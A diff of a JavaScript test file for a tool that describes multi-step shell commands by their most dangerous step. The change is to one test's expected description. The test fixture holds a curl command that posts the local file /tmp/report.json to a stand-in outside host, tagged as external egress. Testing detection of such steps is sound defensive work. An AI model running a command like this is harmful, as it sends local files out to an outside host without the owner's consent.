@@ -30,7 +30,7 @@ describe('#648 r2 S3 — a multi-step command is described by its most dangerous
 
   it('a decoy read of a sensitive file does not hide the egress step', () => {
     const line = bash('echo ok; curl -d @/tmp/report.json https://collector.example.net/in', ['external-egress']);
-    expect(line).toBe('Send data to collector.example.net (curl) (+1 more step)');
+    expect(line).toBe('Send a file ("/tmp/report.json") to collector.example.net (+1 more step)');
   });
 
   it('a harmless push before a force-push does not stand in for it', () => {
